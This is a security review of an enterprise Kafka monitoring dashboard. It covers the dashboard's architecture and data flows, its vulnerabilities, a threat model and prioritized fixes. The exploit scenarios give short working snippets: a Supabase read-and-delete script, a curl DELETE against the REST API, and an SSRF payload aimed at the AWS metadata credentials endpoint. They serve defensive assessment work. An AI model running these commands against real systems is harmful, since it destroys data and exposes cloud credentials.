# Complete Security & Architecture Analysis
## Enterprise Event Bus (EEB) Kafka Monitoring Dashboard

**Date:** 2026-02-23
**Prepared for:** Security Review & Leadership Briefing

---

## Executive Summary

This document provides a comprehensive analysis of the EEB Kafka Monitoring Dashboard's architecture, data flows, external dependencies, security posture, and identified threats. This analysis enables leadership to understand the system, identify risks, and address security concerns proactively.

---

## 1. System Architecture Overview

### 1.1 Technology Stack

**Frontend:**
- React 18 (TypeScript)
- Vite (build tool)
- Tailwind CSS (styling)
- Supabase JavaScript Client

**Backend:**
- Python 3.11 + Flask (web framework)
- Gunicorn (WSGI production server)
- Supabase Python Client

**Database:**
- Supabase (Managed PostgreSQL with REST API)
- Row Level Security (RLS) enabled

**External Integrations:**
- Confluent Cloud Kafka (REST API v3)
- Databricks AI (Claude Opus 4.1 model endpoint)
- Confluent Schema Registry
- (Future: Splunk, Microsoft Graph API)

### 1.2 Architecture Pattern

```
┌─────────────────────────────────────────────────────────┐
│                    User's Browser                        │
│  ┌──────────────────────────────────────────┐           │
│  │   React Frontend (Client-Side JS)        │           │
│  │   - Supabase Direct Connection           │           │
│  │   - Databricks AI via Supabase Edge      │           │
│  └──────────────────────────────────────────┘           │
└─────────────┬────────────────────┬──────────────────────┘
              │                    │
              │                    │ HTTPS (TLS 1.2+)
              │                    │
              ▼                    ▼
┌─────────────────────┐  ┌──────────────────────────────┐
│  Python Flask API   │  │   Supabase Cloud Platform    │
│  - Kafka Sync       │  │   - PostgreSQL Database      │
│  - API Proxying     │  │   - Edge Functions (Deno)    │
│  - Credentials      │  │   - RLS Security             │
└──────────┬──────────┘  └──────────────┬───────────────┘
           │                            │
           │                            │
           ▼                            ▼
┌──────────────────────┐    ┌─────────────────────────┐
│  Confluent Cloud     │    │  Databricks Workspace   │
│  - Kafka REST API    │    │  - AI Model Endpoint    │
│  - Schema Registry   │    │  - Claude Opus 4.1      │
└──────────────────────┘    └─────────────────────────┘
```

---

## 2. Data Flow Analysis

### 2.1 Application Load Flow

```
1. User → Browser: Access application URL
2. Browser → Flask Server: Request index.html
3. Flask → Browser: Serve built React app from /dist
4. Browser: Load JavaScript bundles
5. React App: Initialize Supabase client
6. React → Supabase: Authenticate with anon key
7. React → Supabase: Query topics, alerts, metrics
8. Supabase → React: Return data (RLS enforced)
9. React: Render dashboard
```

**Security Notes:**
- TLS encryption in transit (HTTPS)
- No authentication required (internal dashboard assumption)
- Supabase anon key embedded in client-side JavaScript
- RLS policies control data access

### 2.2 Kafka Topic Sync Flow

```
1. User → React: Click "Sync from Kafka"
2. React → Python Backend: POST /api/sync-kafka-topics
   Body: {
     cluster_id, admin_url, api_key, api_secret,
     cloud_provider, schema_registry_url
   }
3. Python → Confluent Cloud: GET /kafka/v3/clusters/{id}/topics
   Auth: Basic (api_key:api_secret)
4. Confluent → Python: Return topics list with metadata
5. Python → Schema Registry: GET /subjects/{topic}-value/versions/latest
   (For each topic)
6. Schema Registry → Python: Return schema definition
7. Python → Supabase: Upsert topics data
8. Python → React: Return sync results
```

**Security Notes:**
- Confluent credentials can be sent from frontend OR read from backend .env
- Credentials transmitted over HTTPS (encrypted in transit)
- Credentials temporarily in memory on Python server
- Proxy support for corporate firewalls
- 30-second timeout to prevent hanging

### 2.3 AI Assistant Flow

```
1. User → React: Ask question in AI Assistant
2. React → Supabase Database: Fetch context data
   (alerts, topics, incidents, performance metrics)
3. React: Build context prompt with full data
4. React → Supabase Edge Function: POST /databricks-ai
   Body: { messages, max_tokens, temperature }
   Auth: Bearer {SUPABASE_ANON_KEY}
5. Edge Function → Databricks: POST /serving-endpoints/{endpoint}/invocations
   Auth: Bearer {DATABRICKS_TOKEN}
6. Databricks → Edge Function: AI response
7. Edge Function → React: Return response
8. React: Display AI message
```

**Security Notes:**
- Databricks credentials stored as Supabase secrets (not in frontend)
- Full database content sent to Databricks AI in context
- Rate limiting: 5 requests per minute (client-side enforcement)
- No data persistence on Databricks side (stateless inference)

---

## 3. Data Storage & Persistence

### 3.1 Database Schema

**Primary Tables:**
- `topics` - Kafka topic metadata (100+ records)
- `alerts` - System alerts and incidents (50+ records)
- `performance_metrics` - Topic performance data
- `topic_lineage` - Topic relationships
- `updates` - Daily status updates
- `ingest_projects` - Data ingestion projects
- `oncall_team_members` - On-call rotation
- `oncall_rotation` - Rotation schedule
- `topic_notes` - Topic documentation
- `topic_documents` - Document attachments

**Data Residency:**
- Hosted on Supabase Cloud (AWS us-east-1 or custom region)
- PostgreSQL 15.x
- Full database backups (Supabase managed)

### 3.2 Data Sensitivity Classification

| Data Type | Sensitivity | Examples | Risk Level |
|-----------|-------------|----------|------------|
| **Topic Metadata** | Internal | Topic names, partitions, retention | Medium |
| **Schema Definitions** | Confidential | Field names, data structures | High |
| **Performance Metrics** | Internal | Consumer lag, throughput | Low |
| **Incident Data** | Confidential | ServiceNow incident details | High |
| **API Credentials** | Critical | Confluent API keys, tokens | Critical |
| **On-Call Info** | Internal | Team member names, schedules | Medium |

---

## 4. External Dependencies & Attack Surface

### 4.1 External Services

| Service | Purpose | Data Sent | Credentials | Risk |
|---------|---------|-----------|-------------|------|
| **Supabase** | Database, Auth, Edge Functions | All dashboard data | Anon key, Service role key | High |
| **Confluent Cloud** | Kafka topic metadata sync | Cluster ID, API calls | API key/secret | High |
| **Databricks** | AI assistance | Full database context + questions | Bearer token | Critical |
| **Schema Registry** | Schema versioning | Schema subject names | API key/secret | High |

### 4.2 Attack Surface Map

```
┌──────────────────────────────────────────────────────┐
│              Internet-Facing Components               │
├──────────────────────────────────────────────────────┤
│                                                       │
│  1. React Application (Static Assets)                │
│     - Publicly accessible                            │
│     - Contains Supabase anon key                     │
│     - No sensitive business logic                    │
│                                                       │
│  2. Python Flask API (if publicly exposed)           │
│     - /api/sync-kafka-topics (accepts credentials)   │
│     - /api/health                                    │
│     - /api/topics, /api/alerts (read operations)     │
│                                                       │
│  3. Supabase Edge Functions                          │
│     - /functions/v1/databricks-ai                    │
│     - /functions/v1/sync-kafka-topics                │
│                                                       │
└──────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────┐
│               Backend Infrastructure                  │
├──────────────────────────────────────────────────────┤
│                                                       │
│  1. Supabase PostgreSQL Database                     │
│     - Row Level Security enabled                     │
│     - Direct client connections allowed              │
│                                                       │
│  2. Environment Variables (.env files)               │
│     - Stored on servers, not in Git                  │
│     - Contains all API keys/secrets                  │
│                                                       │
└──────────────────────────────────────────────────────┘
```

---

## 5. Security Posture Analysis

### 5.1 ✅ Security Strengths

1. **Database Security:**
   - Row Level Security (RLS) enabled on all tables
   - Supabase manages TLS encryption, backups, updates
   - Database credentials not in frontend code

2. **API Key Management:**
   - Confluent credentials can be server-side only
   - Databricks token stored as Supabase secret (not exposed)
   - Python backend proxies sensitive API calls

3. **Network Security:**
   - HTTPS/TLS for all external communications
   - Corporate proxy support for firewall environments
   - CORS headers properly configured

4. **Code Security:**
   - TypeScript type safety in frontend
   - Input validation on API endpoints
   - Error handling with timeout protection

### 5.2 🔴 Critical Security Vulnerabilities

#### 5.2.1 **CRITICAL: Public Database Access with No Authentication**

**Issue:** RLS policies use `USING (true)` which grants unrestricted access to anyone with the Supabase anon key.

```sql
-- Current RLS Policy (INSECURE)
CREATE POLICY "Allow anon and authenticated to read topics"
  ON topics FOR SELECT
  TO anon, authenticated
  USING (true);  -- ⚠️ NO RESTRICTIONS!
```

**Impact:**
- Anyone with the anon key can read ALL data
- Anyone can INSERT, UPDATE, DELETE records
- No audit trail of who made changes
- No user-level access control

**Exploit Scenario:**
```javascript
// Any user can extract anon key from browser and use it
const stolenKey = "eyJhbGc..."; // From browser DevTools
const supabase = createClient(url, stolenKey);

// Now they can read everything
const { data } = await supabase.from('topics').select('*');

// Or delete everything
await supabase.from('topics').delete().neq('id', '');
```

**Recommendation:** Implement Supabase Auth with user authentication

#### 5.2.2 **CRITICAL: Confluent Credentials Can Be Sent from Frontend**

**Issue:** The `/api/sync-kafka-topics` endpoint accepts credentials in the request body, meaning frontend JavaScript can send arbitrary Confluent credentials.

```python
# app.py line 50-57
api_key = request_data.get('api_key', CONFLUENT_API_KEY)
api_secret = request_data.get('api_secret', CONFLUENT_API_SECRET)
```

**Impact:**
- Credentials transmitted through browser (visible in DevTools)
- Credentials logged in browser console, network logs
- Credentials temporarily in browser memory
- MITM attacks possible if TLS compromised

**Exploit Scenario:**
```javascript
// Malicious user inspects network traffic
// They see credentials being sent
const credentials = {
  api_key: "ABCD1234",
  api_secret: "secretvalue123"
};

// They can now use these credentials externally
```

**Recommendation:** Always read credentials from environment variables server-side only

#### 5.2.3 **CRITICAL: Full Database Context Sent to External AI Service**

**Issue:** The AI Assistant sends ALL database content (topics, schemas, incidents, etc.) to Databricks AI endpoint.

```typescript
// AIAssistant.tsx line 58-253
const context = await fetchContextData();
// Includes: all topics, schemas, incidents, performance metrics, PII
const response = await databricksClient.answerQuestion(textToSend, context);
```

**Impact:**
- Confidential schema definitions exposed
- Incident details sent externally
- Team member names/schedules transmitted
- Potential compliance violations (GDPR, HIPAA, etc.)

**Data Leakage Examples:**
- "Topic: payments.credit-card-transactions.v1"
- "Schema: { ssn: string, account_number: string }"
- "Incident INC0012345: Database breach on 2026-01-15"

**Recommendation:** Implement data masking, minimize context, or use on-premise AI

#### 5.2.4 **HIGH: Supabase Anon Key Exposed in Frontend Bundle**

**Issue:** The Supabase anon key is embedded in the JavaScript bundle and visible to anyone.

```typescript
// src/lib/supabase.ts
const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY;
export const supabase = createClient(supabaseUrl, supabaseAnonKey);
```

**Impact:**
- Anyone can extract the key from DevTools
- Key can be used to access database directly
- Key can be used from any origin (CORS allows *)
- No IP-based access controls

**View in Browser:**
```bash
# Open DevTools > Sources > Search for "supabaseAnonKey"
# Key is visible in plain text
```

**Recommendation:** This is acceptable IF RLS policies are properly restrictive (they are not)

#### 5.2.5 **HIGH: No Rate Limiting on Backend API**

**Issue:** The Python Flask API has no rate limiting, allowing unlimited requests.

```python
# app.py - No rate limiting decorators
@app.route('/api/sync-kafka-topics', methods=['POST'])
def sync_kafka_topics():
    # No rate limit check
```

**Impact:**
- DoS attacks possible
- Credential brute-forcing possible
- Resource exhaustion (Confluent API calls)
- Cost escalation (Databricks AI calls)

**Recommendation:** Implement Flask-Limiter or nginx rate limiting

#### 5.2.6 **HIGH: Credentials Stored in Environment Variables**

**Issue:** All credentials stored in plaintext `.env` files on servers.

```bash
# .env file
CONFLUENT_API_KEY=ABCD1234
CONFLUENT_API_SECRET=secretvalue123
DATABRICKS_TOKEN=dapi123456789
```

**Impact:**
- Server compromise exposes all credentials
- Developers with server access can view credentials
- Backup files may contain credentials
- Process listings may expose environment variables

**Recommendation:** Use secret management service (AWS Secrets Manager, HashiCorp Vault)

#### 5.2.7 **MEDIUM: No Input Validation on Sync Endpoint**

**Issue:** The `/api/sync-kafka-topics` endpoint accepts arbitrary URLs and credentials without validation.

```python
# app.py line 52-53
admin_url = request_data.get('admin_url', CONFLUENT_ADMIN_URL)
cluster_id = request_data.get('cluster_id', CONFLUENT_CLUSTER_ID)
# No validation of URL format, no allowlist
```

**Impact:**
- SSRF (Server-Side Request Forgery) attacks
- Requests to internal network resources
- Credential theft via malicious endpoints

**Exploit Scenario:**
```javascript
// Attacker sends malicious request
fetch('/api/sync-kafka-topics', {
  method: 'POST',
  body: JSON.stringify({
    admin_url: 'http://internal-server:8080/steal-creds',
    api_key: 'test',
    api_secret: 'test'
  })
});
// Python backend makes request to internal server
// Attacker receives credentials in their logs
```

**Recommendation:** Validate URLs against allowlist, use URL parsing validation

#### 5.2.8 **MEDIUM: CORS Allows All Origins**

**Issue:** Edge functions and API allow requests from any origin (`Access-Control-Allow-Origin: *`).

```typescript
// sync-kafka-topics/index.ts line 3
const corsHeaders = {
  'Access-Control-Allow-Origin': '*',  // ⚠️ ALL ORIGINS
};
```

**Impact:**
- Any website can make requests
- CSRF attacks possible
- Credential theft via malicious websites

**Recommendation:** Restrict CORS to specific allowed origins

#### 5.2.9 **LOW: Verbose Error Messages**

**Issue:** API returns detailed error messages including stack traces, URLs, credentials hints.

```python
# app.py line 104-110
return jsonify({
    'error': 'Failed to fetch topics from Confluent',
    'details': response.text[:1000],  # May include sensitive info
    'url': url,  # Exposes internal URLs
    'traceback': error_traceback  # Full stack trace
}), 500
```

**Impact:**
- Information disclosure
- Helps attackers understand system internals
- May expose file paths, credentials

**Recommendation:** Log detailed errors server-side, return generic messages to clients

---

## 6. Threat Model

### 6.1 Threat Actors

| Actor | Motivation | Capability | Likelihood |
|-------|------------|------------|------------|
| **External Attacker** | Data theft, sabotage | Medium-High | Medium |
| **Malicious Insider** | Data exfiltration | High | Low |
| **Script Kiddie** | Defacement, DoS | Low | High |
| **Competitor** | Intelligence gathering | Medium | Low |
| **Nation-State** | Espionage | Very High | Very Low |

### 6.2 Attack Scenarios

#### Scenario 1: Database Takeover via Stolen Anon Key
```
1. Attacker visits dashboard, opens DevTools
2. Extracts Supabase anon key from JavaScript bundle
3. Uses key to connect directly to Supabase from their machine
4. Executes: DELETE FROM topics; DELETE FROM alerts;
5. All data destroyed, no authentication required
6. Dashboard becomes unusable
```
**Impact:** Critical - Complete data loss
**Mitigation:** Implement authentication, restrict RLS policies

#### Scenario 2: Credential Theft via Network Inspection
```
1. Attacker uses public WiFi, performs MITM attack
2. User initiates Kafka sync from dashboard
3. Credentials sent from frontend to backend (HTTPS, but...)
4. If TLS compromised or weak, attacker captures credentials
5. Attacker uses credentials to access Confluent Cloud directly
6. Attacker can read/write/delete Kafka topics
```
**Impact:** Critical - Full Kafka cluster compromise
**Mitigation:** Never send credentials from frontend

#### Scenario 3: Data Exfiltration via AI Assistant
```
1. Legitimate user asks AI: "Show me all payment topics"
2. AI receives full context including schemas, owners, descriptions
3. Databricks logs contain all this data
4. Databricks employee or breach exposes logs
5. Sensitive schema definitions leaked
```
**Impact:** High - Confidential data exposure
**Mitigation:** Minimize context, implement data masking

#### Scenario 4: SSRF Attack via Sync Endpoint
```
1. Attacker sends crafted sync request
POST /api/sync-kafka-topics
{ "admin_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }

2. Python backend makes request to AWS metadata service
3. Metadata service returns EC2 instance credentials
4. Credentials sent back in error message
5. Attacker now has cloud infrastructure access
```
**Impact:** Critical - Cloud account compromise
**Mitigation:** URL validation, network egress filtering

#### Scenario 5: Mass Data Deletion via Public API
```
1. Attacker discovers public Supabase endpoint
2. Uses anon key to connect via curl
curl -X DELETE \
  https://xxx.supabase.co/rest/v1/topics?id=gt.0 \
  -H "apikey: eyJhbGc..."

3. All topics deleted, no authentication required
4. No audit log of who performed deletion
```
**Impact:** Critical - Data destruction
**Mitigation:** Implement authentication, audit logging

---

## 7. Compliance & Regulatory Concerns

### 7.1 Data Privacy Regulations

| Regulation | Applicability | Compliance Status |
|------------|---------------|-------------------|
| **GDPR** | If EU users or data | ⚠️ **NON-COMPLIANT** - No consent, no data subject rights |
| **CCPA** | If California users | ⚠️ **NON-COMPLIANT** - No privacy notices |
| **HIPAA** | If healthcare data | ❌ **VIOLATION** - No BAA, data sent to 3rd parties |
| **SOX** | If financial data | ⚠️ **RISK** - No access controls, audit logs |
| **FINRA** | If financial services | ⚠️ **RISK** - No data retention policy |

### 7.2 Industry Standards

| Standard | Requirement | Current Status |
|----------|-------------|----------------|
| **OWASP Top 10** | Security best practices | ❌ Multiple violations (A01, A02, A05, A07) |
| **SOC 2** | Access controls, logging | ❌ No authentication, no audit logs |
| **ISO 27001** | Information security | ⚠️ Gaps in access control, encryption at rest |
| **PCI DSS** | If payment card data | ❌ **CRITICAL** - No segmentation, weak access control |

---

## 8. Recommendations (Prioritized)

### 8.1 CRITICAL (Immediate Action Required)

1. **Implement Authentication**
   - Add Supabase Auth with email/password
   - Require login for all dashboard access
   - Store user identity for audit logging
   - **Timeline:** 1-2 days

2. **Fix RLS Policies**
   - Replace `USING (true)` with `auth.uid() = user_id`
   - Add ownership columns to all tables
   - Test policies thoroughly
   - **Timeline:** 1 day

3. **Remove Credentials from Frontend**
   - Read ALL credentials from backend .env only
   - Remove credential parameters from sync endpoint
   - Update frontend to never handle secrets
   - **Timeline:** 2-3 hours

4. **Implement Data Masking for AI**
   - Redact sensitive schema fields
   - Hash or tokenize PII before sending to AI
   - Minimize context to summary statistics only
   - **Timeline:** 1-2 days

### 8.2 HIGH (Within 1 Week)

5. **Add Rate Limiting**
   - Implement Flask-Limiter on all endpoints
   - Set: 10 requests/minute per IP for sync
   - Set: 5 requests/minute for AI assistant (already client-side)
   - **Timeline:** 4 hours

6. **Secret Management**
   - Migrate to AWS Secrets Manager or HashiCorp Vault
   - Rotate all existing credentials
   - Implement automatic rotation policy
   - **Timeline:** 2-3 days

7. **Input Validation**
   - Validate all URL parameters against allowlist
   - Sanitize user inputs
   - Implement SSRF protections
   - **Timeline:** 1 day

8. **Restrict CORS**
   - Replace `*` with specific allowed origins
   - Implement origin validation
   - **Timeline:** 1 hour

### 8.3 MEDIUM (Within 1 Month)

9. **Audit Logging**
   - Log all database modifications
   - Log all API calls with user identity
   - Set up log aggregation (Splunk/ELK)
   - **Timeline:** 1 week

10. **Incident Response Plan**
    - Document breach notification procedures
    - Define escalation paths
    - Set up alerting for suspicious activity
    - **Timeline:** 1 week

11. **Security Testing**
    - Penetration testing
    - Vulnerability scanning
    - Code security review
    - **Timeline:** Ongoing

12. **Data Classification**
    - Document all data types and sensitivity
    - Implement data retention policies
    - Set up data backup and recovery
    - **Timeline:** 2 weeks

---

## 9. Questions Leadership Should Ask

### 9.1 Risk Acceptance

- **Q:** "Is this an internal-only dashboard, or will external users access it?"
  - If external: Authentication is CRITICAL
  - If internal only: Still recommend authentication

- **Q:** "What is the impact if all data is deleted or leaked?"
  - Operational disruption?
  - Compliance violations?
  - Reputation damage?

- **Q:** "Do we have a disaster recovery plan if the database is compromised?"
  - Backups? RTO/RPO?

### 9.2 Data Sensitivity

- **Q:** "Does any of this data fall under regulatory compliance (GDPR, HIPAA, PCI, etc.)?"
  - If yes: URGENT fixes required

- **Q:** "Are Kafka topic schemas considered confidential intellectual property?"
  - If yes: AI context must be masked

### 9.3 Access Control

- **Q:** "Who should have access to this dashboard?"
  - Specific teams only?
  - Need role-based access control (RBAC)?

- **Q:** "Do we need audit trails showing who made what changes?"
  - If yes: Implement authentication + logging

### 9.4 Third-Party Risk

- **Q:** "Have we reviewed Databricks' data handling policies?"
  - Where is data processed?
  - Is data retained?
  - Who has access?

- **Q:** "Do we have Business Associate Agreements (BAA) with Supabase and Databricks?"
  - Required for HIPAA compliance

---

## 10. Conclusion

The EEB Kafka Monitoring Dashboard is a **functional and useful tool**, but it has **critical security vulnerabilities** that must be addressed before production use, especially if:
- External users will access it
- Sensitive data (PII, financial, health) is involved
- Regulatory compliance is required

**Immediate actions required:**
1. Implement authentication
2. Fix RLS policies
3. Remove credentials from frontend
4. Mask data sent to AI

**Risk Level:** **HIGH** without these fixes, **MEDIUM** after implementing Critical recommendations, **LOW** after implementing all recommendations.

---

## Appendix A: Resource Inventory

### External Resources Used

| Resource | Type | Provider | Data Residency | Cost Model |
|----------|------|----------|----------------|------------|
| Supabase Database | PostgreSQL | Supabase Inc. | AWS us-east-1 | Pay-as-you-go |
| Supabase Edge Functions | Serverless | Supabase Inc. | Global CDN | Per-invocation |
| Confluent Cloud | Kafka | Confluent Inc. | Multi-region | Per GB + cluster hours |
| Databricks AI | LLM Endpoint | Databricks Inc. | AWS | Per token |
| Schema Registry | Schema storage | Confluent Inc. | Multi-region | Included with Kafka |

### Credentials Inventory

| Credential | Purpose | Stored Where | Rotation Policy |
|------------|---------|--------------|-----------------|
| SUPABASE_URL | Database connection | .env, Frontend | N/A (public) |
| SUPABASE_ANON_KEY | Database access | .env, Frontend | Manual |
| SUPABASE_SERVICE_ROLE_KEY | Admin access | .env, Edge Functions | Manual |
| CONFLUENT_API_KEY | Kafka access | .env | Manual |
| CONFLUENT_API_SECRET | Kafka auth | .env | Manual |
| DATABRICKS_TOKEN | AI endpoint | Supabase secrets | Manual |

**⚠️ No credentials have automatic rotation enabled**

---

## Appendix B: Incident Response Contacts

**Security Team:** [TO BE DEFINED]
**On-Call Engineer:** See dashboard On-Call tab
**Supabase Support:** https://supabase.com/support
**Confluent Support:** https://support.confluent.io
**Databricks Support:** https://databricks.com/support

---

**Document Version:** 1.0
**Last Updated:** 2026-02-23
**Next Review:** 2026-03-23
